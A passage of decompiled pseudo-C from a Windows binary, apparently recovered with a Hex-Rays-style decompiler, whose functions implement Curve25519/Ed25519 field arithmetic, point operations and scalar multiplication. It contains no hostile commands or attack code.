  __int64 v5; // r14
  __int64 v6; // r15
  __int64 v7; // rbx
  __int64 v8; // rbp
  __int64 v9; // r12
  __int64 v10; // rdx
  __int64 v11; // r10
  __int64 v12; // r11
  __int64 v13; // rdi
  __int64 v14; // r12
  __int64 v15; // r8
  __int64 v16; // rsi
  __int64 v17; // rbp
  __int64 v18; // r11
  __int64 v19; // r8
  unsigned __int64 v20; // r13
  __int64 result; // rax
  __int64 v22; // [rsp+0h] [rbp-C8h]
  __int64 v23; // [rsp+8h] [rbp-C0h]
  __int64 v24; // [rsp+10h] [rbp-B8h]
  __int64 v25; // [rsp+20h] [rbp-A8h]
  unsigned __int64 v26; // [rsp+20h] [rbp-A8h]
  __int64 v27; // [rsp+28h] [rbp-A0h]
  __int64 v28; // [rsp+30h] [rbp-98h]
  __int64 v29; // [rsp+38h] [rbp-90h]
  __int64 v30; // [rsp+40h] [rbp-88h]
  __int64 v31; // [rsp+50h] [rbp-78h]
  __int64 v32; // [rsp+58h] [rbp-70h]
  __int64 v33; // [rsp+60h] [rbp-68h]
  __int64 v34; // [rsp+70h] [rbp-58h]
  __int64 v35; // [rsp+78h] [rbp-50h]
  int v36; // [rsp+D8h] [rbp+10h]
  __int64 v37; // [rsp+E0h] [rbp+18h]
  __int64 v38; // [rsp+E8h] [rbp+20h]

  v2 = a2[2];
  v3 = a2[6];
  v4 = *a2;
  v5 = a2[3];
  v6 = a2[8];
  v7 = a2[1];
  v36 = a2[9];
  v29 = a2[5];
  v33 = a2[7];
  v27 = a2[4];
  v8 = 19 * (int)v3;
  v28 = 2 * (int)v27;
  v37 = 2 * (int)v5;
  v23 = 2 * (int)v2;
  v22 = 2 * (int)v7;
  v24 = 38 * v36;
  v32 = 19 * (int)v6;
  v9 = 38 * (int)v33;
  v38 = 2 * (v8 * v28 + v9 * v37 + v32 * v23 + v24 * v22 + v4 * v4 + v29 * 38 * (int)v29);
  v10 = 2 * (int)v4;
  v11 = v2;
  v31 = 2 * (int)v29;
  v25 = 2 * (v10 * v27 + v11 * v11 + v37 * v22 + v9 * v33 + v24 * v31 + v32 * 2 * (int)v3);
  v30 = ((v38 + 0x2000000) >> 26) + 2 * (v10 * v7 + v37 * v32 + v8 * v31 + v9 * v27 + v24 * v2);
  v12 = 2 * (int)v33;
  v13 = v3;
  v34 = ((v25 + 0x2000000) >> 26) + 2 * (v29 * v10 + v22 * v27 + v32 * v12 + v23 * v5 + v24 * v3);
  v14 = ((v30 + 0x1000000) >> 25) + 2 * (v10 * v11 + v28 * v32 + v37 * v24 + v9 * v31 + v8 * v3 + v22 * v7);
  v35 = ((v34 + 0x1000000) >> 25) + 2 * (v10 * v3 + v23 * v27 + v22 * v31 + v37 * v5 + v24 * v12 + v32 * v6);
  v15 = v3;
  v16 = ((v14 + 0x2000000) >> 26) + 2 * (v10 * v5 + v32 * v31 + 38 * (int)v33 * v3 + v24 * v27 + v22 * v11);
  v17 = ((v35 + 0x2000000) >> 26) + 2 * (v24 * v6 + v29 * v23 + v37 * v27 + v22 * v13 + v33 * v10);
  v26 = ((v16 + 0x1000000) >> 25) - ((v25 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v25;
  v18 = ((v17 + 0x1000000) >> 25) + 2 * (v27 * v27 + v24 * v36 + v10 * v6 + v37 * v31 + v23 * v15 + v22 * v12);
  v19 = ((v18 + 0x2000000) >> 26) + 2 * (v22 * v6 + v10 * v36 + v29 * v28 + v23 * v33 + v37 * v15);
  v20 = 19 * ((v19 + 0x1000000) >> 25) - ((v38 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v38;
  *a1 = v20 - ((v20 + 0x2000000) & 0xFC000000);
  a1[1] = v30 + ((__int64)(v20 + 0x2000000) >> 26) - ((v30 + 0x1000000) & 0xFE000000);
  a1[2] = v14 - ((v14 + 0x2000000) & 0xFC000000);
  a1[3] = v16 - ((v16 + 0x1000000) & 0xFE000000);
  a1[6] = v35 - ((v35 + 0x2000000) & 0xFC000000);
  a1[4] = v26 - ((v26 + 0x2000000) & 0xFC000000);
  a1[7] = v17 - ((v17 + 0x1000000) & 0xFE000000);
  a1[8] = v18 - ((v18 + 0x2000000) & 0xFC000000);
  result = ((_DWORD)v34 + 0x1000000) & 0xFE000000;
  a1[5] = v34 + ((__int64)(v26 + 0x2000000) >> 26) - result;
  a1[9] = v19 - ((v19 + 0x1000000) & 0xFE000000);
  return result;
}

//----- (00000001400698D0) ----------------------------------------------------
__int64 __fastcall sub_1400698D0(_BYTE *a1, int *a2)
{
  int v2; // r8d
  int v3; // r9d
  int v4; // r10d
  int v5; // r11d
  int v6; // ebx
  int v7; // edi
  int v8; // esi
  int v9; // ebp
  int v10; // r14d
  int v11; // edx
  int v12; // eax
  int v13; // r8d
  int v14; // eax
  int v15; // r9d
  int v16; // eax
  int v17; // r10d
  int v18; // eax
  int v19; // r11d
  int v20; // eax
  int v21; // ebx
  int v22; // eax
  int v23; // edi
  int v24; // eax
  int v25; // esi
  int v26; // eax
  int v27; // ebp
  int v28; // eax
  int v29; // edx
  __int64 result; // rax

  v2 = *a2;
  v3 = a2[1];
  v4 = a2[2];
  v5 = a2[3];
  v6 = a2[4];
  v7 = a2[5];
  v8 = a2[6];
  v9 = a2[7];
  v10 = a2[8];
  v11 = a2[9];
  v12 = 19
      * ((v11
        + ((v10
          + ((v9
            + ((v8
              + ((v7
                + ((v6 + ((v5 + ((v4 + ((v3 + ((v2 + ((19 * v11 + 0x1000000) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)
      + v2;
  v13 = v12 & 0x3FFFFFF;
  *a1 = v12;
  v14 = (v12 >> 26) + v3;
  v15 = v14 & 0x1FFFFFF;
  v16 = (v14 >> 25) + v4;
  v17 = v16 & 0x3FFFFFF;
  v18 = (v16 >> 26) + v5;
  v19 = v18 & 0x1FFFFFF;
  v20 = (v18 >> 25) + v6;
  v21 = v20 & 0x3FFFFFF;
  v22 = (v20 >> 26) + v7;
  v23 = v22 & 0x1FFFFFF;
  v24 = (v22 >> 25) + v8;
  v25 = v24 & 0x3FFFFFF;
  v26 = (v24 >> 26) + v9;
  v27 = v26 & 0x1FFFFFF;
  v28 = (v26 >> 25) + v10;
  v29 = ((v28 >> 26) + v11) & 0x1FFFFFF;
  a1[1] = BYTE1(v13);
  a1[2] = BYTE2(v13);
  a1[16] = v23;
  a1[3] = (4 * v15) | HIBYTE(v13);
  a1[4] = v15 >> 6;
  a1[5] = v15 >> 14;
  a1[7] = v17 >> 5;
  a1[8] = v17 >> 13;
  a1[6] = (8 * v17) | (v15 >> 22);
  a1[9] = (32 * v19) | (v17 >> 21);
  a1[10] = v19 >> 3;
  a1[11] = v19 >> 11;
  a1[13] = v21 >> 2;
  a1[14] = v21 >> 10;
  a1[17] = BYTE1(v23);
  a1[18] = BYTE2(v23);
  a1[12] = ((_BYTE)v21 << 6) | (v19 >> 19);
  a1[20] = v25 >> 7;
  a1[21] = v25 >> 15;
  a1[15] = v21 >> 18;
  a1[19] = (2 * v25) | HIBYTE(v23);
  a1[23] = v27 >> 5;
  a1[24] = v27 >> 13;
  a1[22] = (8 * v27) | (v25 >> 23);
  a1[25] = (16 * v28) | (v27 >> 21);
  a1[26] = (v28 & 0x3FFFFFF) >> 4;
  a1[27] = (v28 & 0x3FFFFFF) >> 12;
  LOBYTE(v10) = ((_BYTE)v29 << 6) | ((v28 & 0x3FFFFFF) >> 20);
  a1[29] = v29 >> 2;
  result = v29 >> 10;
  a1[31] = v29 >> 18;
  a1[28] = v10;
  a1[30] = result;
  return result;
}

//----- (0000000140069B40) ----------------------------------------------------
__int64 __fastcall sub_140069B40(int *a1, _DWORD *a2, int *a3)
{
  _DWORD *v3; // r14
  int *v4; // rbp
  int *v5; // rdi
  int v6; // r12d
  int v7; // eax
  int v8; // esi
  int v9; // ebx
  int v10; // r11d
  int v11; // r10d
  int v12; // r9d
  int v13; // r8d
  int v14; // edx
  int v15; // ecx
  int v16; // r13d
  int v17; // eax
  __int64 result; // rax
  int v19; // edx
  int v20; // r8d
  int v21; // r9d
  int v22; // r10d
  int v23; // r11d
  int v24; // esi
  int v25; // r15d
  int v27; // [rsp+2Ch] [rbp-6Ch]
  int v28; // [rsp+34h] [rbp-64h]
  int v29; // [rsp+38h] [rbp-60h]
  int v30; // [rsp+3Ch] [rbp-5Ch]
  int v31; // [rsp+40h] [rbp-58h]
  int v32; // [rsp+44h] [rbp-54h]
  int v33; // [rsp+48h] [rbp-50h]
  int v34; // [rsp+4Ch] [rbp-4Ch]
  int v35; // [rsp+50h] [rbp-48h]
  int v36; // [rsp+54h] [rbp-44h]
  int v37; // [rsp+58h] [rbp-40h]
  int v38; // [rsp+5Ch] [rbp-3Ch]

  v3 = a2;
  v4 = a1;
  *a1 = a2[10] + *a2;
  v5 = a3;
  a1[1] = a2[11] + a2[1];
  a1[2] = a2[2] + a2[12];
  a1[3] = a2[3] + a2[13];
  a1[4] = a2[4] + a2[14];
  a1[5] = a2[15] + a2[5];
  a1[6] = a2[6] + a2[16];
  a1[7] = a2[7] + a2[17];
  a1[8] = a2[8] + a2[18];
  a1[9] = a2[19] + a2[9];
  a1[10] = a2[10] - *a2;
  a1[11] = a2[11] - a2[1];
  a1[12] = a2[12] - a2[2];
  a1[13] = a2[13] - a2[3];
  a1[14] = a2[14] - a2[4];
  a1[15] = a2[15] - a2[5];
  a1[16] = a2[16] - a2[6];
  a1[17] = a2[17] - a2[7];
  a1[18] = a2[18] - a2[8];
  a1[19] = a2[19] - a2[9];
  sub_1400682A0(a1 + 20, a1, a3);
  sub_1400682A0(v4 + 10, v4 + 10, v5 + 10);
  sub_1400682A0(v4 + 30, v5 + 20, v3 + 30);
  v29 = 2 * v3[20];
  v30 = 2 * v3[21];
  v31 = 2 * v3[22];
  v32 = 2 * v3[23];
  v6 = v4[13];
  v33 = 2 * v3[24];
  v27 = v4[23];
  v34 = 2 * v3[25];
  v28 = v4[24];
  v35 = 2 * v3[26];
  v36 = 2 * v3[27];
  v37 = 2 * v3[28];
  v7 = v3[29];
  LODWORD(v3) = v4[14];
  v38 = 2 * v7;
  *v4 = v4[20] - v4[10];
  v4[1] = v4[21] - v4[11];
  v4[2] = v4[22] - v4[12];
  v4[3] = v27 - v6;
  v4[4] = v28 - (_DWORD)v3;
  LODWORD(v4) = v4[25];
  a1[11] += a1[21];
  v8 = a1[15];
  LODWORD(v5) = a1[26];
  v9 = a1[16];
  v10 = a1[27];
  v11 = a1[17];
  v12 = a1[28];
  v13 = a1[18];
  v14 = a1[29];
  v15 = a1[19];
  v16 = a1[22];
  a1[5] = (_DWORD)v4 - v8;
  a1[6] = (_DWORD)v5 - v9;
  a1[7] = v10 - v11;
  a1[8] = v12 - v13;
  a1[9] = v14 - v15;
  v17 = a1[20] + a1[10];
  a1[12] += v16;
  a1[10] = v17;
  a1[13] = v27 + v6;
  a1[14] = v28 + (_DWORD)v3;
  a1[15] = v8 + (_DWORD)v4;
  a1[16] = v9 + (_DWORD)v5;
  a1[17] = v11 + v10;
  a1[18] = v13 + v12;
  result = (unsigned int)(v15 + v14);
  a1[19] = result;
  a1[20] = v29 + a1[30];
  a1[21] = v30 + a1[31];
  a1[22] = v31 + a1[32];
  a1[23] = v32 + a1[33];
  a1[24] = v33 + a1[34];
  a1[25] = v34 + a1[35];
  a1[26] = v35 + a1[36];
  a1[27] = v36 + a1[37];
  a1[28] = v37 + a1[38];
  a1[29] = v38 + a1[39];
  v19 = v29 - a1[30];
  v20 = v30 - a1[31];
  v21 = v31 - a1[32];
  v22 = v32 - a1[33];
  v23 = v33 - a1[34];
  LODWORD(v5) = v35 - a1[36];
  v24 = v36 - a1[37];
  LODWORD(v3) = v37 - a1[38];
  v25 = v38 - a1[39];
  a1[35] = v34 - a1[35];
  a1[39] = v25;
  a1[30] = v19;
  a1[31] = v20;
  a1[32] = v21;
  a1[33] = v22;
  a1[34] = v23;
  a1[36] = (int)v5;
  a1[37] = v24;
  a1[38] = (int)v3;
  return result;
}

//----- (0000000140069F10) ----------------------------------------------------
__int64 __fastcall sub_140069F10(_DWORD *a1, int *a2)
{
  int *v2; // rsi
  _DWORD *v3; // rdi
  _DWORD *v4; // rbx
  int v5; // ecx
  int v6; // r13d
  int v7; // r12d
  int v8; // eax
  int v9; // r14d
  int v10; // r15d
  int v11; // ebp
  int v12; // r11d
  int v13; // r9d
  int v14; // r10d
  int v15; // r8d
  int v16; // edx
  int v17; // ecx
  __int64 result; // rax
  int v20; // [rsp+28h] [rbp-80h]
  int v21; // [rsp+2Ch] [rbp-7Ch]
  int v22; // [rsp+34h] [rbp-74h]
  int v23; // [rsp+38h] [rbp-70h]
  int v24[10]; // [rsp+40h] [rbp-68h] BYREF

  v2 = a2;
  v3 = a1;
  sub_140068DC0(a1, a2);
  sub_140068DC0(v3 + 20, v2 + 10);
  sub_140069360(v3 + 30, v2 + 20);
  v3[10] = v2[10] + *v2;
  v4 = v3;
  v3[11] = v2[11] + v2[1];
  v3[12] = v2[2] + v2[12];
  v3[13] = v2[3] + v2[13];
  v3[14] = v2[4] + v2[14];
  v3[15] = v2[5] + v2[15];
  v3[16] = v2[6] + v2[16];
  v3[17] = v2[7] + v2[17];
  v3[18] = v2[8] + v2[18];
  v3[19] = v2[9] + v2[19];
  sub_140068DC0(v24, v3 + 10);
  v5 = v3[20];
  v6 = v3[2];
  v7 = v3[24];
  v8 = v5 + *v3;
  v9 = v3[4];
  v10 = v3[3];
  v11 = v3[25];
  LODWORD(v2) = v3[26];
  v12 = v3[6];
  v3[10] = v8;
  LODWORD(v3) = v3[5];
  v22 = v4[22];
  v4[12] = v6 + v22;
  v23 = v4[23];
  v20 = v5;
  v21 = v4[21];
  v4[11] = v4[1] + v21;
  v4[13] = v10 + v23;
  v4[14] = v9 + v7;
  v4[15] = (_DWORD)v3 + v11;
  v13 = a1[7];
  v4[16] = v12 + (_DWORD)v2;
  LODWORD(v4) = v4[27];
  a1[17] = v13 + (_DWORD)v4;
  v14 = a1[28];
  v15 = a1[29];
  v16 = a1[8];
  a1[18] = v16 + v14;
  v17 = a1[9];
  a1[19] = v17 + v15;
  a1[20] = v20 - *a1;
  a1[21] = v21 - a1[1];
  a1[24] = v7 - v9;
  a1[25] = v11 - (_DWORD)v3;
  a1[26] = (_DWORD)v2 - v12;
  a1[27] = (_DWORD)v4 - v13;
  a1[28] = v14 - v16;
  a1[29] = v15 - v17;
  a1[22] = v22 - v6;
  a1[23] = v23 - v10;
  *a1 = v24[0] - v8;
  a1[1] = v24[1] - a1[11];
  a1[2] = v24[2] - a1[12];
  a1[3] = v24[3] - a1[13];
  a1[4] = v24[4] - a1[14];
  a1[5] = v24[5] - a1[15];
  a1[6] = v24[6] - a1[16];
  a1[7] = v24[7] - a1[17];
  a1[8] = v24[8] - a1[18];
  a1[9] = v24[9] - a1[19];
  a1[30] -= a1[20];
  a1[31] -= a1[21];
  a1[32] -= a1[22];
  a1[33] -= a1[23];
  a1[34] -= a1[24];
  a1[35] -= a1[25];
  a1[36] -= a1[26];
  a1[37] -= a1[27];
  a1[38] -= a1[28];
  result = (unsigned int)a1[29];
  a1[39] -= result;
  return result;
}

//----- (000000014006A1E0) ----------------------------------------------------
__int64 __fastcall sub_14006A1E0(__int64 a1, __int64 a2)
{
  unsigned __int8 *v3; // r9
  char *v4; // r8
  __int64 v5; // r10
  unsigned __int8 v6; // dl
  unsigned __int8 v7; // cl
  char v8; // al
  int v9; // esi
  __int64 i; // rdx
  char *v11; // r13
  int v12; // edi
  char *v13; // rdi
  __int64 result; // rax
  int v15[10]; // [rsp+20h] [rbp-E0h] BYREF
  int v16[10]; // [rsp+48h] [rbp-B8h] BYREF
  int v17[10]; // [rsp+70h] [rbp-90h] BYREF
  int v18[10]; // [rsp+98h] [rbp-68h] BYREF
  int v19[10]; // [rsp+C0h] [rbp-40h] BYREF
  _DWORD v20[10]; // [rsp+E8h] [rbp-18h] BYREF
  _DWORD v21[12]; // [rsp+110h] [rbp+10h] BYREF
  int v22[32]; // [rsp+140h] [rbp+40h] BYREF
  char v23; // [rsp+1C0h] [rbp+C0h] BYREF
  char v24[62]; // [rsp+1C1h] [rbp+C1h] BYREF
  char v25; // [rsp+1FFh] [rbp+FFh]

  v3 = (unsigned __int8 *)(a2 + 1);
  v4 = v24;
  v5 = 16i64;
  do
  {
    v6 = *(v3 - 1);
    v4 += 4;
    v7 = *v3;
    v3 += 2;
    *(v4 - 4) = v6 >> 4;
    *(v4 - 5) = v6 & 0xF;
    *(v4 - 3) = v7 & 0xF;
    *(v4 - 2) = v7 >> 4;
    --v5;
  }
  while ( v5 );
  v8 = 0;
  v9 = 0;
  for ( i = 0i64; i < 63; ++i )
  {
    v24[i - 1] += v8;
    v8 = (char)(v24[i - 1] + 8) >> 4;
    v24[i - 1] -= 16 * v8;
  }
  v25 += v8;
  v11 = v24;
  v12 = 1;
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 40) = 1;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  *(_DWORD *)(a1 + 80) = 1;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  *(_QWORD *)(a1 + 136) = 0i64;
  *(_QWORD *)(a1 + 144) = 0i64;
  *(_QWORD *)(a1 + 152) = 0i64;
  do
  {
    sub_14006A5A0((__int64)v22, (unsigned int)v12 >> 1, *v11);
    sub_140069B40(v15, (_DWORD *)a1, v22);
    sub_1400682A0((_DWORD *)a1, v15, v18);
    sub_1400682A0((_DWORD *)(a1 + 40), v16, v17);
    sub_1400682A0((_DWORD *)(a1 + 80), v17, v18);
    sub_1400682A0((_DWORD *)(a1 + 120), v15, v16);
    v12 += 2;
    v11 += 2;
  }
  while ( v12 < 64 );
  memmove(v19, (const void *)a1, 0x28ui64);
  memmove(v20, (const void *)(a1 + 40), 0x28ui64);
  memmove(v21, (const void *)(a1 + 80), 0x28ui64);
  sub_140069F10(v15, v19);
  sub_1400682A0(v19, v15, v18);
  sub_1400682A0(v20, v16, v17);
  sub_1400682A0(v21, v17, v18);
  sub_140069F10(v15, v19);
  sub_1400682A0(v19, v15, v18);
  sub_1400682A0(v20, v16, v17);
  sub_1400682A0(v21, v17, v18);
  sub_140069F10(v15, v19);
  sub_1400682A0(v19, v15, v18);
  sub_1400682A0(v20, v16, v17);
  sub_1400682A0(v21, v17, v18);
  sub_140069F10(v15, v19);
  sub_1400682A0((_DWORD *)a1, v15, v18);
  sub_1400682A0((_DWORD *)(a1 + 40), v16, v17);
  sub_1400682A0((_DWORD *)(a1 + 80), v17, v18);
  sub_1400682A0((_DWORD *)(a1 + 120), v15, v16);
  v13 = &v23;
  do
  {
    sub_14006A5A0((__int64)v22, (unsigned int)v9 >> 1, *v13);
    sub_140069B40(v15, (_DWORD *)a1, v22);
    sub_1400682A0((_DWORD *)a1, v15, v18);
    sub_1400682A0((_DWORD *)(a1 + 40), v16, v17);
    sub_1400682A0((_DWORD *)(a1 + 80), v17, v18);
    result = sub_1400682A0((_DWORD *)(a1 + 120), v15, v16);
    v9 += 2;
    v13 += 2;
  }
  while ( v9 < 64 );
  return result;
}
// 14006A1E0: using guessed type int var_F0[32];
// 14006A1E0: using guessed type int var_198[10];
// 14006A1E0: using guessed type int var_170[10];
// 14006A1E0: using guessed type _DWORD var_148[10];
// 14006A1E0: using guessed type _DWORD var_120[12];
// 14006A1E0: using guessed type int var_210[10];
// 14006A1E0: using guessed type int var_1C0[10];
// 14006A1E0: using guessed type int var_1E8[10];

//----- (000000014006A5A0) ----------------------------------------------------
void __fastcall sub_14006A5A0(__int64 a1, int a2, char a3)
{
  unsigned int v4; // esi
  int v5; // ebx
  __int64 v6; // r11
  __int64 v7; // r11
  __int64 v8; // r11
  __int64 v9; // r11
  __int64 v10; // r11
  __int64 v11; // r11
  __int64 v12; // r11
  _DWORD v13[10]; // [rsp+20h] [rbp-A8h] BYREF
  char v14[40]; // [rsp+48h] [rbp-80h] BYREF
  int v15; // [rsp+70h] [rbp-58h]
  int v16; // [rsp+74h] [rbp-54h]
  int v17; // [rsp+78h] [rbp-50h]
  int v18; // [rsp+7Ch] [rbp-4Ch]
  int v19; // [rsp+80h] [rbp-48h]
  int v20; // [rsp+84h] [rbp-44h]
  int v21; // [rsp+88h] [rbp-40h]
  int v22; // [rsp+8Ch] [rbp-3Ch]
  int v23; // [rsp+90h] [rbp-38h]
  int v24; // [rsp+94h] [rbp-34h]

  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)a1 = 1;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 40) = 1;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  v4 = (unsigned int)a3 >> 31;
  v5 = (unsigned __int8)(a3 - 2 * (a3 < 0 ? a3 : 0));
  sub_140067BA0((_DWORD *)a1, &dword_140106C20[240 * a2], (v5 ^ 1) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[30] + v6), (v5 ^ 2) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[60] + v7), (v5 ^ 3) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[90] + v8), (v5 ^ 4) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[120] + v9), (v5 ^ 5) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[150] + v10), (v5 ^ 6) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[180] + v11), (v5 ^ 7) - 1 < 0);
  sub_140067BA0((_DWORD *)a1, (_DWORD *)((char *)&dword_140106C20[210] + v12), (v5 ^ 8) - 1 < 0);
  memmove(v13, (const void *)(a1 + 40), 0x28ui64);
  memmove(v14, (const void *)a1, 0x28ui64);
  v15 = -*(_DWORD *)(a1 + 80);
  v16 = -*(_DWORD *)(a1 + 84);
  v17 = -*(_DWORD *)(a1 + 88);
  v18 = -*(_DWORD *)(a1 + 92);
  v19 = -*(_DWORD *)(a1 + 96);
  v20 = -*(_DWORD *)(a1 + 100);
  v21 = -*(_DWORD *)(a1 + 104);
  v22 = -*(_DWORD *)(a1 + 108);
  v23 = -*(_DWORD *)(a1 + 112);
  v24 = -*(_DWORD *)(a1 + 116);
  sub_140067BA0((_DWORD *)a1, v13, v4);
}
// 14006A666: variable 'v6' is possibly undefined
// 14006A686: variable 'v7' is possibly undefined
// 14006A6A6: variable 'v8' is possibly undefined
// 14006A6C6: variable 'v9' is possibly undefined
// 14006A6E6: variable 'v10' is possibly undefined
// 14006A70D: variable 'v11' is possibly undefined
// 14006A722: variable 'v12' is possibly undefined
// 140106C20: using guessed type _DWORD dword_140106C20[7680];
// 14006A5A0: using guessed type _DWORD var_A8[10];
// 14006A5A0: using guessed type char var_80[40];

//----- (000000014006A810) ----------------------------------------------------
__int64 __fastcall sub_14006A810(_BYTE *a1, __m128i *a2, unsigned __int8 *a3)
{
  __m128i v3; // xmm2
  int v4; // edi
  int v5; // ebx
  int v6; // r8d
  int v7; // r10d
  int v8; // r9d
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // edx
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // r13d
  int v24; // eax
  int v25; // r15d
  int v26; // eax
  int v27; // esi
  int v28; // eax
  int v29; // ebx
  int v30; // eax
  int v31; // r10d
  int v32; // eax
  int v33; // r8d
  int v34; // eax
  int v35; // edx
  int v36; // eax
  int v37; // ebx
  int v38; // edi
  int v39; // esi
  int v40; // r14d
  int v41; // r15d
  int v42; // r12d
  int v43; // r13d
  bool v44; // sf
  int v46; // [rsp+24h] [rbp-DCh]
  int v47; // [rsp+28h] [rbp-D8h]
  int v48; // [rsp+2Ch] [rbp-D4h]
  int v49; // [rsp+30h] [rbp-D0h]
  int v50; // [rsp+34h] [rbp-CCh]
  int v51; // [rsp+38h] [rbp-C8h]
  int v52; // [rsp+3Ch] [rbp-C4h]
  int v53; // [rsp+40h] [rbp-C0h]
  int v54; // [rsp+44h] [rbp-BCh]
  int v55; // [rsp+48h] [rbp-B8h]
  int v56; // [rsp+4Ch] [rbp-B4h]
  int v57; // [rsp+50h] [rbp-B0h]
  int v58; // [rsp+54h] [rbp-ACh]
  int v59; // [rsp+58h] [rbp-A8h]
  int v60; // [rsp+5Ch] [rbp-A4h]
  int v61; // [rsp+60h] [rbp-A0h]
  int v62; // [rsp+64h] [rbp-9Ch]
  int v63; // [rsp+68h] [rbp-98h]
  int v64; // [rsp+6Ch] [rbp-94h]
  int v65; // [rsp+70h] [rbp-90h]
  int v66; // [rsp+74h] [rbp-8Ch]
  int v67; // [rsp+78h] [rbp-88h]
  int v68; // [rsp+7Ch] [rbp-84h]
  int v69; // [rsp+80h] [rbp-80h]
  int v70; // [rsp+84h] [rbp-7Ch]
  __int64 v72; // [rsp+90h] [rbp-70h] BYREF
  __int64 v73; // [rsp+98h] [rbp-68h]
  __int64 v74; // [rsp+A0h] [rbp-60h]
  __int64 v75; // [rsp+A8h] [rbp-58h]
  __int64 v76; // [rsp+B0h] [rbp-50h]
  __int64 v77; // [rsp+B8h] [rbp-48h] BYREF
  __int64 v78; // [rsp+C0h] [rbp-40h]
  __int64 v79; // [rsp+C8h] [rbp-38h]
  __int64 v80; // [rsp+D0h] [rbp-30h]
  __int64 v81; // [rsp+D8h] [rbp-28h]
  __int64 v82; // [rsp+E0h] [rbp-20h] BYREF
  __int64 v83; // [rsp+E8h] [rbp-18h]
  __int64 v84; // [rsp+F0h] [rbp-10h]
  __int64 v85; // [rsp+F8h] [rbp-8h]
  __int64 v86; // [rsp+100h] [rbp+0h]
  int v87; // [rsp+108h] [rbp+8h] BYREF
  int v88; // [rsp+10Ch] [rbp+Ch]
  int v89; // [rsp+110h] [rbp+10h]
  int v90; // [rsp+114h] [rbp+14h]
  int v91; // [rsp+118h] [rbp+18h]
  int v92; // [rsp+11Ch] [rbp+1Ch]
  int v93; // [rsp+120h] [rbp+20h]
  int v94; // [rsp+124h] [rbp+24h]
  int v95; // [rsp+128h] [rbp+28h]
  int v96; // [rsp+12Ch] [rbp+2Ch]
  int v97; // [rsp+130h] [rbp+30h] BYREF
  int v98; // [rsp+134h] [rbp+34h]
  int v99; // [rsp+138h] [rbp+38h]
  int v100; // [rsp+13Ch] [rbp+3Ch]
  int v101; // [rsp+140h] [rbp+40h]
  int v102; // [rsp+144h] [rbp+44h]
  int v103; // [rsp+148h] [rbp+48h]
  int v104; // [rsp+14Ch] [rbp+4Ch]
  int v105; // [rsp+150h] [rbp+50h]
  int v106; // [rsp+154h] [rbp+54h]
  int v107; // [rsp+158h] [rbp+58h] BYREF
  int v108; // [rsp+15Ch] [rbp+5Ch]
  int v109; // [rsp+160h] [rbp+60h]
  int v110; // [rsp+164h] [rbp+64h]
  int v111; // [rsp+168h] [rbp+68h]
  int v112; // [rsp+16Ch] [rbp+6Ch]
  int v113; // [rsp+170h] [rbp+70h]
  int v114; // [rsp+174h] [rbp+74h]
  int v115; // [rsp+178h] [rbp+78h]
  int v116; // [rsp+17Ch] [rbp+7Ch]
  int Src[10]; // [rsp+180h] [rbp+80h] BYREF
  __m128i v118; // [rsp+1A8h] [rbp+A8h]
  __m128i v119; // [rsp+1B8h] [rbp+B8h]

  v3 = *a2;
  v4 = 0;
  v119 = a2[1];
  v118 = v3;
  v118.m128i_i8[0] = _mm_cvtsi128_si32(v3) & 0xF8;
  v119.m128i_i8[15] = HIBYTE(_mm_srli_si128(v119, 8).m128i_u64[0]) & 0x3F | 0x40;
  sub_140067D50(Src, a3);
  v82 = 0i64;
  v83 = 0i64;
  v84 = 0i64;
  v5 = 1;
  v85 = 0i64;
  v86 = 0i64;
  v72 = 0i64;
  v73 = 0i64;
  v74 = 0i64;
  v75 = 0i64;
  v76 = 0i64;
  memmove(&v107, Src, 0x28ui64);
  v6 = 254;
  v77 = 0i64;
  v7 = 1;
  v78 = 0i64;
  v79 = 0i64;
  v80 = 0i64;
  v81 = 0i64;
  v68 = 254;
  while ( 1 )
  {
    v69 = (v118.m128i_u8[v6 / 8] >> (v6 & 7)) & 1;
    v8 = -(v4 ^ v69);
    v9 = v8 & (v107 ^ v5);
